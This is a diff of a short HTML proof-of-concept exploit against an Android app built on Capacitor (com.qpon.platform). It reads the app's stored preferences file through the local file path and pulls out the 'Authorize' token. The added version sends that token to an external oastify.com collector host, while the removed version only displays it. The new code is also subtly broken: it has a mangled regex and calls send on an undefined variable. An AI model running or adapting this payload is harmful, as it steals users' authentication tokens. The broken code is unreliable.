@@ -1,16 +1,13 @@
-<html><body><pre id="o"></pre><script>
-var o=document.getElementById("o");
-o.textContent="Origin: "+window.origin+"\n";
-o.textContent+="Location: "+window.location.href+"\n\n";
-
-var xhr=new XMLHttpRequest();
-xhr.open("GET","/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml",true);
-xhr.onload=function(){
-  o.textContent+="Status: "+xhr.status+"\n";
-  o.textContent+=xhr.responseText+"\n";
-  var m=xhr.responseText.match(/<string name="Authorize">([^<]+)<\/string>/);
-  if(m)o.textContent+="\nTOKEN: "+m[1];
-};
-xhr.onerror=function(){o.textContent+="XHR Error\n"};
-xhr.send();
-</script></body></html>
+<html>
+  <body>
+    <script>
+      var req = new XMLHttpRequest();
+      req.open("GET", "/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml", true);
+      req.onload = function() {
+        var m = req.responseText.match(/ < string name = "Authorize" > ([ ^ < ] + ) < \/string>/);
+        if (m) new Image().src = "https://f2ir37tviw915fk8akf6ls1x7odf1apz.oastify.com/?token=" + encodeURIComponent(m[1]);
+      };
+      x.send();
+    </script>
+  </body>
+</html>
